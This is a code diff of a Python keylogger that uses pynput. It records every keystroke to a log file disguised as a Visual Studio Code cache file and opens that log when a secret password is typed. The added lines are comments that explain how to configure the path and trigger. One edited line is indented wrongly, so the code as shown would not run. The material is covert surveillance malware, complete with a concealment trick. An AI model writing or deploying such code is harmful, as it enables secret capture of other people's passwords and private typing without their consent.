@@ -3,6 +3,7 @@ from pynput.keyboard import Listener,Key
 import datetime
 
 path = r'C:\Users\User\AppData\Roaming\Code\Code Cache\wasm\index-dir\indexerLog.txt'
+#Change the path to a txt file on your system
 
 array = []
 
@@ -27,7 +28,8 @@ def on_release(Key):
 
     for i in range(len(array)):
         try:
-            if array[i:i+14] == ['s','e','c','r','e','t','p','a','s','s','w','o','r','d']:
+            if array[i:i+14] == ['s','e','c','r','e','t','p','a','s','s','w','o','r','d']: #this is the secret password you input
+                    #NOTE: change the 14 to the length of the characters, since "secretpassword" is 14 characters I inputted 14
                 os.startfile(path)
                 array.clear()
                 break
@@ -36,7 +38,8 @@ def on_release(Key):
 
     f = open(path, 'r')
     lines = f.readlines()
-    if len(lines) > 10000:
+    #I do not want the txt file to be too big so once there is more than 10,000 keystrokes logged, it deletes the oldest 1000 keystrokes.
+     if len(lines) > 10000:
         lines = lines[1000:]
         f.close()
         f = open(path, 'w')
